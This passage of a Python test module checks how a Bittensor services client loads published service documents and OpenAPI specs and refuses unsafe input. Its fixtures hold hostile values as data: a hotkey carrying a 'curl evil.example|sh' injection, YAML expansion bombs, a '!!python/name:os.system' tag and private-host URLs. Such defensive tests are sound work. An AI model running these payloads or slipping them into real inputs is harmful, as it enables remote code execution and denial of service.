"""Subnet services: reading a published service and calling it.

Covers `bittensor.services` and `btcli service`.
"""

from __future__ import annotations

import asyncio
import contextlib
import dataclasses
import gzip
import io
import json
import os
import re
import socket
import threading
import time
import urllib.parse
import urllib.request
from pathlib import Path

import pytest
import yaml

from bittensor import Client, http_auth, services, wallets
from bittensor.services import Response, ServiceError
from bittensor.sp_core import CRYPTO_SR25519, Keypair
from tests.harness.fake_substrate import FakeSubstrate
from tests.harness.samples import ALICE, ALICE_HOT, BOB_HOT
from tests.unit.test_cli_commands import (  # noqa: F401
    _WALLET_NAME,
    app,
    invoke,
    isolated_cli,
    runner,
    wallet_dir,
)


def wallet_hotkey() -> str:
    return wallets.open_wallet(_WALLET_NAME, path=os.environ["BT_WALLET_PATH"]).hotkey.ss58_address


DOC_URL = "https://svc.example/services.json"
SPEC_URL = "https://svc.example/api/openapi.json"
BALANCE_URL = "https://svc.example/balance"
BTAUTH = {"type": "apiKey", "in": "header", "name": "X-Bittensor-Signature"}


CAROL_HOT = Keypair.create_from_uri("//Charlie//hot").ss58_address


def document(**changes) -> dict:
    doc = {
        "version": 1,
        "name": "Example",
        "description": "An example service",
        "publishers": [{"netuid": 1, "hotkey": ALICE_HOT}],
        "services": [{"type": "openapi", "endpoint": SPEC_URL}],
        "payments": [{"type": "gamma", "signature": "btauth/1", "balance": BALANCE_URL}],
    }
    doc.update(changes)
    return doc


def spec(**changes) -> dict:
    value = {
        "openapi": "3.1.0",
        "servers": [{"url": "/api/v1"}],
        "components": {
            "securitySchemes": {"btauth": BTAUTH, "key": {"type": "http", "scheme": "bearer"}},
            "parameters": {
                "Limit": {"name": "limit", "in": "query", "schema": {"type": "integer"}}
            },
            "schemas": {
                "Job": {
                    "type": "object",
                    "required": ["model"],
                    "properties": {
                        "model": {"type": "string", "description": "Model id"},
                        "tags": {"type": "array", "items": {"type": "string"}},
                        "dry_run": {"type": "boolean"},
                        "input": {"oneOf": [{"type": "string"}, {"type": "array"}]},
                    },
                }
            },
        },
        "security": [{"btauth": []}],
        "tags": [{"name": "jobs", "description": "Your jobs"}],
        "paths": {
            "/models": {
                "get": {
                    "operationId": "listModels",
                    "security": [],
                    "summary": "Models",
                    "tags": ["models"],
                }
            },
            "/jobs": {
                "parameters": [{"$ref": "#/components/parameters/Limit"}],
                "get": {"operationId": "listJobs", "summary": "Jobs", "tags": ["jobs"]},
                "post": {
                    "operationId": "createJob",
                    "tags": ["jobs", "write"],
                    "requestBody": {
                        "required": True,
                        "content": {
                            "application/json": {"schema": {"$ref": "#/components/schemas/Job"}}
                        },
                    },
                },
            },
            "/jobs/{id}": {
                "get": {
                    "operationId": "getJob",
                    "parameters": [
                        {"name": "id", "in": "path", "schema": {"type": "string"}},
                        {"name": "X-Trace", "in": "header", "schema": {"type": "string"}},
                    ],
                }
            },
            "/admin": {"get": {"operationId": "admin", "security": [{"key": []}]}},
            "/both": {"get": {"operationId": "both", "security": [{"btauth": [], "key": []}]}},
            "/maybe": {"get": {"operationId": "maybe", "security": [{"key": []}, {}]}},
            "/unnamed": {"get": {"summary": "No id"}},
            "/upload": {
                "post": {
                    "operationId": "upload",
                    "requestBody": {"content": {"multipart/form-data": {"schema": {}}}},
                }
            },
        },
    }
    value.update(changes)
    return value


class FakeWeb:
    """The HTTP layer: canned responses by url, and every request sent."""

    def __init__(self, pages: dict[str, object]):
        self.pages = pages
        self.sent: list[tuple[str, str, dict, bytes]] = []

    def __call__(
        self, method, url, headers, data, local=False, limit=None, timeout=None, into=None
    ):
        self.sent.append((method, url, dict(headers), data))
        page = self.pages.get(url.split("?")[0] if url not in self.pages else url)
        if callable(page):  # answers by the request's headers
            page = page(headers)
        if page is None:
            page = Response(404, {}, b"")
        elif not isinstance(page, Response):
            page = Response(200, {"content-type": "application/json"}, json.dumps(page).encode())
        sink = into(dataclasses.replace(page, content=b"")) if into and page.ok else None
        if sink is None:
            return page
        sink.write(page.content)
        return dataclasses.replace(page, content=b"")


def signed_only(page: dict):
    """A page that answers only a btauth/1 signed request."""
    return lambda headers: page if http_auth.HEADER_SIGNATURE in headers else Response(401, {}, b"")


@pytest.fixture()
def web(monkeypatch) -> FakeWeb:
    fake = FakeWeb({DOC_URL: document(), SPEC_URL: spec()})
    monkeypatch.setattr(services, "_send", fake)
    return fake


def chain(urls: dict[str, str]) -> FakeSubstrate:
    sub = FakeSubstrate()
    sub.seed_map("SubtensorModule", "Services", [(hk, {"url": url}) for hk, url in urls.items()])
    sub.seed("SubtensorModule", "SubnetOwnerHotkey", [1], ALICE_HOT)
    sub.seed("SubtensorModule", "SubnetOwner", [1], ALICE)
    sub.seed("SubtensorModule", "Owner", [ALICE_HOT], ALICE)
    return sub


def every_service(urls: dict[str, str]) -> FakeSubstrate:
    """The chain as discovery reads it: every Services entry, keyed by netuid and hotkey."""
    sub = FakeSubstrate()
    sub.seed_map(
        "SubtensorModule", "Services", [((1, hk), {"url": url}) for hk, url in urls.items()]
    )
    return sub


def load(urls=None, hotkey=None, network="finney") -> services.Service:
    client = Client(network, substrate=chain({ALICE_HOT: DOC_URL} if urls is None else urls))
    return asyncio.run(services.load(client, 1, hotkey))


def caller(sent, service: services.Service) -> http_auth.Caller:
    method, url, headers, data = sent
    split = urllib.parse.urlsplit(url)
    target = split.path + (f"?{split.query}" if split.query else "")
    return http_auth.verify(
        headers,
        data,
        method=method,
        path=target,
        self_hotkey_ss58=service.hotkey,
        expected_crypto_type=CRYPTO_SR25519,
        nonce_store=http_auth.InMemoryNonceStore(),
    )


@pytest.fixture(scope="module")
def key() -> Keypair:
    return Keypair.create_from_uri("//Dave", CRYPTO_SR25519)


class TestLoad:
    def test_reads_the_document_and_the_spec(self, web):
        service = load()
        assert (service.name, service.hotkey, service.spec_url) == ("Example", ALICE_HOT, SPEC_URL)
        assert service.api_url == "https://svc.example/api/v1"
        assert service.balance_url == BALANCE_URL

    def test_a_transferred_hotkey_is_no_longer_the_owner(self, web):
        urls = {ALICE_HOT: DOC_URL, BOB_HOT: DOC_URL}
        for substrate, global_listing in ((chain(urls), False), (every_service(urls), True)):
            substrate.seed("SubtensorModule", "SubnetOwnerHotkey", [1], ALICE_HOT)
            substrate.seed("SubtensorModule", "SubnetOwner", [1], ALICE)
            substrate.seed("SubtensorModule", "Owner", [ALICE_HOT], BOB_HOT)
            client = Client("finney", substrate=substrate)
            if not global_listing:
                with pytest.raises(ServiceError, match="no service from its subnet owner"):
                    asyncio.run(services.load(client, 1))
            published = asyncio.run(services.discover(client, None if global_listing else 1))
            assert len(published) == 2 and not any(row.owner for row in published)

    @pytest.mark.parametrize("netuid,hotkey", [(65536, ALICE_HOT), (-1, ALICE_HOT), (1, "invalid")])
    def test_document_identifiers_are_validated(self, web, netuid, hotkey):
        web.pages[DOC_URL] = document(publishers=[{"netuid": netuid, "hotkey": hotkey}])
        with pytest.raises(ServiceError, match="does not list"):
            asyncio.run(services.load_url(DOC_URL))

    def test_a_subnet_with_several_services_means_its_owners(self, web):
        owners = load({ALICE_HOT: DOC_URL, BOB_HOT: DOC_URL})
        assert (owners.hotkey, owners.owner) == (ALICE_HOT, True)
        web.pages[DOC_URL] = document(
            publishers=[{"netuid": 1, "hotkey": BOB_HOT}, {"netuid": 1, "hotkey": CAROL_HOT}]
        )
        with pytest.raises(ServiceError, match="no service from its subnet owner"):
            load({BOB_HOT: DOC_URL, CAROL_HOT: DOC_URL})
        with pytest.raises(ServiceError, match="name a validator"):
            load({BOB_HOT: DOC_URL})
        validators = load({BOB_HOT: DOC_URL, CAROL_HOT: DOC_URL}, BOB_HOT)
        assert (validators.hotkey, validators.owner) == (BOB_HOT, False)
        web.pages[DOC_URL] = document()
        with pytest.raises(ServiceError, match="no services"):
            load({})
        with pytest.raises(ServiceError, match="published no service"):
            load(hotkey=BOB_HOT)

    def test_the_document_must_list_its_hotkey(self, web):
        web.pages[DOC_URL] = document(publishers=[{"netuid": 1, "hotkey": BOB_HOT}])
        with pytest.raises(ServiceError, match="publishers"):
            load()
        web.pages[DOC_URL] = document(publishers=None)
        with pytest.raises(ServiceError, match="publishers"):
            load()

    @pytest.mark.parametrize(
        "payments",
        [
            [],
            [{"type": "gamma", "balance": BALANCE_URL}],
            [{"type": "gamma", "signature": "btauth/1"}],
        ],
        ids=["none", "unsigned", "no-balance"],
    )
    def test_the_document_must_take_signed_gamma_with_a_balance(self, web, payments):
        web.pages[DOC_URL] = document(payments=payments)
        with pytest.raises(ServiceError, match="gamma payment"):
            load()

    def test_an_http_service_names_the_spec_and_its_servers_place_the_api(self, web):
        web.pages[DOC_URL] = document(
            services=[{"type": "http", "endpoint": "https://svc.example", "spec": SPEC_URL}]
        )
        assert load().api_url == "https://svc.example/api/v1"

    def test_a_document_without_a_spec_is_refused(self, web):
        web.pages[DOC_URL] = document(
            services=[{"type": "mcp", "endpoint": "https://svc.example/mcp"}]
        )
        with pytest.raises(ServiceError, match="names no OpenAPI spec"):
            load()

    def test_a_document_may_name_several_specs(self, web):
        other_url = "https://svc.example/training.json"
        other = spec(servers=[{"url": "https://train.svc.example"}])
        other["paths"] = {
            "/models": {
                "post": {
                    "operationId": "trainModel",
                    "requestBody": {
                        "content": {
                            "application/json": {"schema": {"$ref": "#/components/schemas/Run"}}
                        }
                    },
                }
            },
        }
        other["components"]["schemas"] = {"Run": {"type": "object", "properties": {"epochs": {}}}}
        other["tags"] = [{"name": "training", "description": "Training runs"}]
        web.pages[other_url] = other
        entries = [
            {"type": "openapi", "endpoint": SPEC_URL},
            {"type": "http", "endpoint": "https://svc.example", "spec": other_url},
            {"type": "openapi", "endpoint": "https://svc.example/gone.json"},
        ]
        web.pages[DOC_URL] = document(services=entries)
        service = load()
        assert service.spec_urls == (SPEC_URL, other_url)
        assert (service.spec_url, service.api_url) == (SPEC_URL, "https://svc.example/api/v1")
        train = service.operation("train-model")
        assert train.api_url == "https://train.svc.example"
        assert [i.name for i in train.inputs] == ["epochs"]
        assert service.tool("train-model")["input_schema"]["properties"]["body"] == {
            "type": "object",
            "properties": {"epochs": {}},
        }
        assert "listJobs" in service.operations and service.tags["training"] == "Training runs"
        assert any(s.path == "https://svc.example/gone.json" for s in service.skipped)

    def test_specs_share_the_document_limits(self, web, monkeypatch):
        other = "https://svc.example/other.json"
        web.pages[other] = {"openapi": "3.1.0", "paths": {}}
        web.pages[DOC_URL] = document(
            services=[{"type": "openapi", "endpoint": url} for url in (SPEC_URL, other)]
        )
        size = len(json.dumps(web.pages[SPEC_URL]).encode())
        monkeypatch.setattr(services, "MAX_SPEC_BYTES", size)
        service = load()
        assert service.spec_urls == (SPEC_URL,)
        assert any(skipped.path == other for skipped in service.skipped)
        assert not any(url == other for _, url, _, _ in web.sent)

        monkeypatch.setattr(services, "MAX_SPECS", 1)
        with pytest.raises(ServiceError, match="more than 1 OpenAPI specs") as error:
            load()
        assert error.value.code == "too_large"

    def test_json_spec_budget_counts_entries_and_ignores_quoted_text(self, web, monkeypatch):
        small = {"openapi": "3.1.0", "info": {"description": '"{[],}:' * 100}, "paths": {}}
        web.pages[SPEC_URL] = small
        monkeypatch.setattr(services, "MAX_SPEC_TOKENS", 20)
        assert load().spec == small
        small["paths"] = {f"/row/{i}": {"get": {}} for i in range(20)}
        with pytest.raises(ServiceError, match="too many entries") as error:
            load()
        assert error.value.code == "too_large"

    def test_the_spec_must_be_openapi_3(self, web):
        web.pages[SPEC_URL] = {"swagger": "2.0", "paths": {}}
        with pytest.raises(ServiceError, match=r"not an OpenAPI 3 spec \(swagger '2.0'\)"):
            load()

    def test_without_a_btauth_scheme_an_operation_is_signed_unless_open_or_otherwise_paid(
        self, web
    ):
        undeclared = spec()
        undeclared["components"]["securitySchemes"] = {"key": {"type": "http"}}
        web.pages[SPEC_URL] = undeclared
        service = load()
        auth = {op.id: op.auth for op in service.operations.values()}
        assert (auth["listModels"], auth["listJobs"], auth["both"], auth["maybe"]) == (
            "open",
            "hotkey",
            "hotkey",
            "open",
        )
        assert "admin" not in auth
        assert any(
            s.id == "admin" and "credentials other than btauth/1" in s.reason
            for s in service.skipped
        )
        del undeclared["security"]
        auth = {op.id: op.auth for op in load().operations.values()}
        assert auth["listJobs"] == "optional"

    def test_a_server_variable_takes_its_default(self, web):
        server = {"url": "https://{region}.svc.example", "variables": {"region": {"default": "eu"}}}
        web.pages[SPEC_URL] = spec(servers=[server])
        assert load().api_url == "https://eu.svc.example"
        web.pages[SPEC_URL] = spec(servers=[{"url": "https://{region}.svc.example"}])
        with pytest.raises(ServiceError, match="'region' with no default"):
            load()

    def test_an_operation_or_its_path_can_name_its_own_server(self, web):
        moved = spec()
        moved["paths"]["/models"]["servers"] = [{"url": "https://other.example/v2"}]
        web.pages[SPEC_URL] = moved
        service = load()
        assert service.operations["listModels"].api_url == "https://other.example/v2"
        asyncio.run(service.call("listModels"))
        assert web.sent[-1][1] == "https://other.example/v2/models"

    @pytest.mark.parametrize(
        "url",
        [
            "http://svc.example/services.json",
            "https://user:pw@svc.example/s.json",
            "ftp://svc.example/s",
            "https://svc.example/s.json\x1b[2J",
        ],
    )
    def test_urls_must_be_https(self, web, url):
        with pytest.raises(ServiceError, match="url"):
            load({ALICE_HOT: url})
        assert not web.sent

    def test_a_document_is_read_by_its_url_without_the_chain(self, web):
        service = asyncio.run(services.load_url(DOC_URL))
        assert (service.netuid, service.hotkey, service.name) == (1, ALICE_HOT, "Example")
        assert service.operations
        with pytest.raises(ServiceError, match="does not list netuid 2 in publishers"):
            asyncio.run(services.load_url(DOC_URL, 2))
        web.pages[DOC_URL] = document(
            publishers=[{"netuid": 1, "hotkey": ALICE_HOT}, {"netuid": 1, "hotkey": BOB_HOT}]
        )
        with pytest.raises(ServiceError, match="lists 2 publishers; name one"):
            asyncio.run(services.load_url(DOC_URL, 1))
        assert asyncio.run(services.load_url(DOC_URL, 1, BOB_HOT)).hotkey == BOB_HOT
        web.pages[DOC_URL] = document(
            publishers=[{"netuid": 1, "hotkey": "5Abc;curl evil.example|sh;#"}]
        )
        with pytest.raises(ServiceError, match="does not list a publisher"):
            asyncio.run(services.load_url(DOC_URL))

    def test_a_document_on_this_machine_is_read_as_on_a_localnet(self, web):
        local = "http://127.0.0.1:8080/services.json"
        web.pages[local] = document(
            services=[{"type": "openapi", "endpoint": "http://127.0.0.1:8080/openapi.json"}]
        )
        web.pages["http://127.0.0.1:8080/openapi.json"] = spec(servers=[{"url": "/"}])
        assert asyncio.run(services.load_url(local)).local
        web.pages[DOC_URL] = document(
            services=[{"type": "openapi", "endpoint": "http://127.0.0.1:8080/openapi.json"}]
        )
        with pytest.raises(ServiceError, match="not a public host"):
            asyncio.run(services.load_url(DOC_URL))

    def test_http_is_allowed_to_this_machine(self, web):
        local = "http://127.0.0.1:8080/services.json"
        web.pages[local] = document(
            services=[{"type": "openapi", "endpoint": "http://127.0.0.1:8080/openapi.json"}]
        )
        web.pages["http://127.0.0.1:8080/openapi.json"] = spec(servers=[{"url": "/"}])
        assert load({ALICE_HOT: local}, network="local").api_url == "http://127.0.0.1:8080/"
        with pytest.raises(ServiceError, match="is not a public host"):
            load({ALICE_HOT: local})  # on a public chain, anyone could publish it

    @pytest.mark.parametrize("kind", ["Live", "Development", "staging"])
    def test_a_public_chain_through_a_local_node_is_not_a_localnet(self, web, monkeypatch, kind):
        local = "http://127.0.0.1:8080/services.json"
        web.pages[local] = document()

        async def chain_type(self):
            return kind

        monkeypatch.setattr(FakeSubstrate, "chain_type", chain_type)
        with pytest.raises(ServiceError, match="is not a public host"):
            load({ALICE_HOT: local}, network="local")

    @pytest.mark.parametrize(
        "spec_url", ["http://127.0.0.1/openapi.json", "https://10.0.0.1/openapi.json"]
    )
    def test_a_public_document_cannot_point_at_this_machine_or_a_private_host(self, web, spec_url):
        web.pages[DOC_URL] = document(services=[{"type": "openapi", "endpoint": spec_url}])
        with pytest.raises(ServiceError, match="not a public host"):
            load()
        assert all(url != spec_url for _, url, _, _ in web.sent)

    def test_documents_that_are_not_json_objects_are_refused(self, web):
        web.pages[DOC_URL] = Response(200, {"content-type": "text/html"}, b"<html>")
        with pytest.raises(ServiceError, match="is not JSON"):
            load()
        web.pages[DOC_URL] = [1]
        with pytest.raises(ServiceError, match="not a JSON object"):
            load()
        web.pages[DOC_URL] = Response(500, {}, b"")
        with pytest.raises(ServiceError, match="HTTP 500"):
            load()

    def test_a_spec_may_be_yaml(self, web):
        yaml_spec = (
            "openapi: 3.1\n"
            "servers: [{url: 'https://svc.example/api'}]\n"
            "paths:\n"
            "  /on:\n"
            "    get:\n"
            "      operationId: listOn\n"
            "      security: []\n"
            "      parameters:\n"
            "        - {name: on, in: query, schema: {type: string, example: 2024-01-01}}\n"
        )
        web.pages[SPEC_URL] = Response(
            200, {"content-type": "application/yaml"}, yaml_spec.encode()
        )
        op = load().operation("list-on")
        assert [(i.name, i.schema["example"]) for i in op.inputs] == [("on", "2024-01-01")]
        assert "application/yaml" in web.sent[-1][2]["Accept"]
        web.pages[SPEC_URL] = Response(200, {}, b"a: [1\n")
        with pytest.raises(ServiceError, match="neither JSON nor YAML"):
            load()

    def test_a_yaml_spec_cannot_expand_past_its_bound(self, web, monkeypatch):
        monkeypatch.setattr(services, "MAX_YAML_NODES", 1000)
        bomb = (
            "a: &a [1, 1, 1, 1, 1, 1, 1, 1, 1, 1]\nb: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a, *a]\n"
        )
        bomb += "c: [*b, *b, *b, *b, *b, *b, *b, *b, *b, *b]\n"
        web.pages[SPEC_URL] = Response(200, {}, bomb.encode())
        with pytest.raises(ServiceError, match="expands past 1000 nodes"):
            load()
        web.pages[SPEC_URL] = Response(200, {}, b"a: &a [*a]\n")
        with pytest.raises(ServiceError, match="expands past 1000 nodes"):
            load()

    def test_yaml_aliases_count_the_text_they_repeat(self, web, monkeypatch):
        monkeypatch.setattr(services, "MAX_YAML_NODES", 25)
        web.pages[SPEC_URL] = Response(
            200,
            {},
            (
                "openapi: 3.1.0\ntext: &description "
                + "x" * 640
                + "\nexample: [*description, *description]\n"
            ).encode(),
        )
        with pytest.raises(ServiceError, match="expands past 25 nodes"):
            load()

    def test_a_yaml_spec_needs_libyaml(self, web, monkeypatch):
        import yaml

        monkeypatch.setattr(yaml, "__with_libyaml__", False)
        web.pages[SPEC_URL] = Response(200, {}, b"openapi: 3.0.3\n")
        with pytest.raises(ServiceError, match="built with libyaml"):
            load()

    def test_a_yaml_spec_is_counted_before_it_is_loaded(self, web, monkeypatch):
        monkeypatch.setattr(services, "MAX_YAML_EVENTS", 1000)
        flat = "a:\n" + "".join(f"  - {{k{i}: v}}\n" for i in range(300))
        web.pages[SPEC_URL] = Response(200, {}, flat.encode())
        with pytest.raises(ServiceError, match="more than 1000 YAML events"):
            load()

    def test_a_yaml_spec_reads_as_json_would(self, web):
        yaml_spec = (
            "openapi: 3.0.3\n"
            "servers: [{url: 'https://svc.example/api'}]\n"
            "paths:\n"
            "  /x:\n"
            "    get:\n"
            "      operationId: getX\n"
            "      security: []\n"
            "      responses: {200: {description: ok}, ~: {description: none}}\n"
        )
        web.pages[SPEC_URL] = Response(200, {}, yaml_spec.encode())
        op = load().operation("getX")
        assert set(op.spec["paths"]["/x"]["get"]["responses"]) == {"200", "null"}
        refused = {
            "!!binary aGk=": "holds a bytes",
            "!!set {a: null}": "holds a set",
            "!!python/name:os.system": "neither JSON nor YAML",
        }
        for value, reason in refused.items():
            web.pages[SPEC_URL] = Response(200, {}, f"openapi: 3.0.3\nx: {value}\n".encode())
            with pytest.raises(ServiceError, match=reason):
                load()

    def test_an_openapi_service_may_name_its_spec_apart_from_its_endpoint(self, web):
        entry = {"type": "openapi", "endpoint": "https://svc.example/api", "spec": SPEC_URL}
        web.pages[DOC_URL] = document(services=[entry])
        assert load().spec_url == SPEC_URL

    def test_discover_loads_every_service_and_says_why_one_cannot_be_used(self, web):
        client = Client("finney", substrate=every_service({ALICE_HOT: DOC_URL, BOB_HOT: SPEC_URL}))
        found = {item.hotkey: item for item in asyncio.run(services.discover(client))}
        assert (found[ALICE_HOT].service.name, found[ALICE_HOT].problem) == ("Example", "")
        assert found[BOB_HOT].service is None
        assert "does not list netuid 1 hotkey" in found[BOB_HOT].problem

    def test_discover_lists_a_service_that_breaks_the_client_as_a_problem(self, web):
        def broken(headers):
            raise ValueError("Invalid IPv6 URL")

        web.pages[SPEC_URL] = broken
        client = Client("finney", substrate=every_service({ALICE_HOT: DOC_URL}))
        (found,) = asyncio.run(services.discover(client))
        assert found.service is None and "Invalid IPv6 URL" in found.problem


class TestOperations:
    def test_hotkey_and_open_operations_are_listed_by_operation_id(self, web):
        service = load()
        auth = {op.id: op.auth for op in service.operations.values()}
        assert {name for name, kind in auth.items() if kind == "hotkey"} == {
            "listJobs",
            "createJob",
            "getJob",
            "GET /unnamed",
            "upload",
        }
        assert {name for name, kind in auth.items() if kind == "open"} == {"listModels", "maybe"}
        assert set(map(str, service.skipped)) == {
            "GET /admin (admin) needs credentials other than btauth/1",
            "GET /both (both) needs credentials other than btauth/1",
        }
        assert service.tags == {"jobs": "Your jobs"}
        assert service.operations["createJob"].tags == ("jobs", "write")

    def test_parameters_and_body_fields_are_one_set_of_inputs(self, web):
        service = load()
        create = service.operations["createJob"]
        assert [(i.name, i.location, i.required) for i in create.inputs] == [
            ("limit", "query", False),
            ("model", "field", True),
            ("tags", "field", False),
            ("dry_run", "field", False),
            ("input", "field", False),
        ]
        get = service.operations["getJob"]
        assert [(i.name, i.location, i.required) for i in get.inputs] == [
            ("id", "path", True),
            ("X-Trace", "header", False),
        ]

    def test_a_body_that_is_not_an_object_is_one_input(self, web):
        listed = spec()
        listed["paths"]["/batch"] = {
            "post": {
                "operationId": "batch",
                "requestBody": {
                    "required": True,
                    "content": {"application/json": {"schema": {"type": "array"}}},
                },
            }
        }
        web.pages[SPEC_URL] = listed
        (body,) = load().operations["batch"].inputs
        assert (body.name, body.location, body.required) == ("body", "body", True)

    def test_a_repeated_operation_id_goes_by_its_method_and_path(self, web):
        repeated = spec()
        repeated["paths"]["/again"] = {"post": {"operationId": "listJobs"}}
        repeated["paths"]["/user"] = {"get": {"operationId": "getUser", "security": []}}
        repeated["paths"]["/user2"] = {"get": {"operationId": "get_user", "security": []}}
        web.pages[SPEC_URL] = repeated
        service = load()
        assert service.operations["listJobs"].path == "/jobs"
        assert service.operations["POST /again"].path == "/again"
        assert service.operations["getUser"].path == "/user"
        assert service.operations["GET /user2"].command == "get-user2"
        assert not service.skipped or all(
            "admin" in str(s) or "both" in str(s) for s in service.skipped
        )

    def test_a_cookie_parameter_is_sent_as_a_cookie(self, web):
        cookies = spec()
        cookies["paths"]["/cookie"] = {
            "get": {
                "operationId": "cookie",
                "security": [],
                "parameters": [
                    {"name": "session", "in": "cookie", "required": True},
                    {"name": "ids", "in": "cookie", "explode": False, "schema": {"type": "array"}},
                ],
            }
        }
        web.pages[SPEC_URL] = cookies
        headers = load().operation("cookie").prepare({"session": "s1", "ids": [1, 2]})[3]
        assert headers["Cookie"] == "session=s1; ids=1,2"

    def test_independent_parameter_and_body_values(self, web):
        example = spec()
        example["paths"]["/items/{id}"] = {
            "put": {
                "parameters": [{"name": "id", "in": "path", "schema": {"type": "string"}}],
                "requestBody": {
                    "content": {
                        "application/json": {
                            "schema": {
                                "properties": {"id": {"type": "integer"}},
                                "additionalProperties": True,
                            }
                        }
                    }
                },
            }
        }
        web.pages[SPEC_URL] = example
        op = load().operation("PUT /items/{id}")
        assert op.prepare({"id": "path"})[-1] == b""
        assert json.loads(op.prepare({"id": "path"}, body={"id": 3, "extra": 1})[-1]) == {
            "id": 3,
            "extra": 1,
        }

    def test_recursive_tools_keep_local_definitions_and_ref_constraints(self, web):
        example = spec()
        job = example["components"]["schemas"]["Job"]
        job["properties"]["child"] = {"$ref": "#/components/schemas/Job", "maxProperties": 4}
        web.pages[SPEC_URL] = example
        schema = load().tool("createJob")["input_schema"]
        child = schema["properties"]["body"]["properties"]["child"]
        assert child["maxProperties"] == 4
        ref = child["$ref"]
        assert ref.startswith("#/$defs/")
        assert schema["$defs"][ref.split("/")[-1]]["properties"]["child"]["$ref"] == ref

    def test_tool_inputs_preserve_schema_literals_and_root_constraints(self, web):
        example = spec()
        schema = example["components"]["schemas"]["Job"]
        literal = {"$ref": "literal text", "a": "x"}
        schema.update(maxProperties=4, additionalProperties={"const": literal})
        web.pages[SPEC_URL] = example
        service = load()
        exported = service.tool("createJob")["input_schema"]["properties"]["body"]
        assert exported == schema
        body = {"model": "m", "extra": literal}
        assert json.loads(service.operation("createJob").prepare({"body": body})[-1]) == body
        with pytest.raises(ServiceError, match="separate body"):
            service.operation("createJob").prepare({"model": "m", "body": body})

    def test_a_literal_is_exported_as_the_spec_writes_it(self, web):
        example = spec()
        example["components"]["schemas"]["Job"]["properties"]["model"]["example"] = "a,b\r\nc,d"
        web.pages[SPEC_URL] = example
        body = load().tool("createJob")["input_schema"]["properties"]["body"]
        assert body["properties"]["model"]["example"] == "a,b\r\nc,d"

    def test_export_never_fails_and_drops_what_a_tool_cannot_use(self, web, monkeypatch):
        example = spec()
        job = example["components"]["schemas"]["Job"]
        job["properties"]["input"] = {"$ref": "other.json", "description": "elsewhere"}
        job["properties"]["broken"] = {"$ref": "#/components/schemas/Missing"}
        job["$id"] = "https://svc.example/job"
        web.pages[SPEC_URL] = example
        service = load()
        body = service.tool("createJob")["input_schema"]["properties"]["body"]
        assert body["properties"]["input"] == {"description": "elsewhere"}
        assert "$id" not in body
        assert service.tool("createJob")["input_schema"]["$defs"]["Missing"] == {}
        monkeypatch.setattr(services, "RESOLVE_BUDGET", 2)
        assert [t["name"] for t in service.tools()] == [
            op.tool_name for op in service.operations.values()
        ]

    def test_export_counts_shared_definitions_in_each_standalone_tool(self, web, monkeypatch):
        api = spec()
        api["components"]["schemas"]["Options"] = {"type": "string", "description": "x" * 6400}
        api["paths"] = {
            f"/search/{i}": {
                "get": {
                    "parameters": [
                        {
                            "name": "options",
                            "in": "query",
                            "schema": {
                                "type": "array",
                                "items": {"$ref": "#/components/schemas/Options"},
                            },
                        }
                    ]
                }
            }
            for i in range(5)
        }
        web.pages[SPEC_URL] = api
        service = load()
        monkeypatch.setattr(services, "MAX_TOOL_NODES", 450)
        assert "Options" in service.tool("get-search-0")["input_schema"]["$defs"]
        with pytest.raises(ServiceError, match="combined tool schemas") as error:
            service.tools()
        assert error.value.code == "too_large"

    def test_normalized_operation_collisions_keep_their_numbering(self, web):
        api = spec()
        api["paths"] = {
            "/first": {"get": {"operationId": "get-asset-2"}},
            **{f"/asset{suffix}": {"get": {}} for suffix in ("", "!", "$", "!$")},
        }
        web.pages[SPEC_URL] = api
        assert [op.command for op in load().operations.values()] == [
            "get-asset-2",
            "get-asset",
            "get-asset-3",
            "get-asset-4",
            "get-asset-5",
        ]

    def test_a_long_operation_name_fits_a_tool_name(self, web):
        long = spec()
        name = "get" + "VeryLongOperationName" * 5
        long["paths"]["/long"] = {"get": {"operationId": name, "security": []}}
        web.pages[SPEC_URL] = long
        service = load()
        tool = service.tool(name)
        assert len(tool["name"]) == 64 and service.operation(tool["name"]).id == name

    def test_an_operation_is_found_by_its_command_name(self, web):
        service = load()
        assert service.operation("create-job") is service.operations["createJob"]
        with pytest.raises(ServiceError, match="did you mean create-job"):
            service.operation("creat-job")

    def test_a_ref_bomb_stops_at_the_budget(self, web):
        bomb = spec()
        schemas = bomb["components"]["schemas"]
        for level in range(12):
            schemas[f"d{level}"] = {"allOf": [{"$ref": f"#/components/schemas/d{level + 1}"}] * 8}
        schemas["d12"] = {"type": "string"}
        web.pages[SPEC_URL] = bomb
        resolved = load().resolve({"$ref": "#/components/schemas/d0"})
        assert len(json.dumps(resolved)) < 10_000_000

    def test_refs_index_into_arrays(self, web):
        indexed = spec()
        indexed["paths"]["/jobs/{id}"]["get"]["parameters"].append(
            {"$ref": "#/paths/~1jobs~1{id}/get/parameters/1"}
        )
        web.pages[SPEC_URL] = indexed
        assert [i.name for i in load().operations["getJob"].inputs] == ["id", "X-Trace"]

    def test_malformed_operations_are_left_out(self, web):
        odd = spec()
        odd["paths"]["/odd"] = {"get": {"operationId": "odd", "security": "btauth"}}
        odd["paths"]["/models"]["get"]["parameters"] = 5
        web.pages[SPEC_URL] = odd
        service = load()
        assert service.operations["odd"].auth == "hotkey"  # malformed: as if it said nothing
        assert service.operations["listModels"].inputs == ()

    def test_allof_and_nullable_bodies_are_fields(self, web):
        composed = spec()
        composed["components"]["schemas"]["Named"] = {
            "type": "object",
            "required": ["name"],
            "properties": {"name": {"type": "string"}, "id": {"readOnly": True}},
        }
        bodies = {
            "allOf": {"allOf": [{"$ref": "#/components/schemas/Named"}, {"properties": {"n": {}}}]},
            "nullable": {"anyOf": [{"$ref": "#/components/schemas/Named"}, {"type": "null"}]},
            "either": {"oneOf": [{"$ref": "#/components/schemas/Named"}, {"type": "array"}]},
        }
        for name, schema in bodies.items():
            composed["paths"][f"/{name}"] = {
                "post": {
                    "operationId": name,
                    "requestBody": {
                        "required": True,
                        "content": {"application/json": {"schema": schema}},
                    },
                }
            }
        web.pages[SPEC_URL] = composed
        service = load()

        def inputs(name):
            return [(i.name, i.location, i.required) for i in service.operations[name].inputs]

        assert inputs("allOf") == [("name", "field", True), ("n", "field", False)]
        assert inputs("nullable") == [("name", "field", True)]
        assert inputs("either") == [("body", "body", True)]

    def test_an_object_parameter_is_sent_as_its_style_says(self, web):
        objects = spec()
        objects["paths"]["/filter"] = {
            "get": {
                "operationId": "filter",
                "security": [],
                "parameters": [
                    {"name": "f", "in": "query", "content": {"application/json": {}}},
                    {"name": "q", "in": "query", "schema": {"type": "string"}},
                ],
            }
        }
        objects["paths"]["/deep"] = {
            "get": {
                "operationId": "deep",
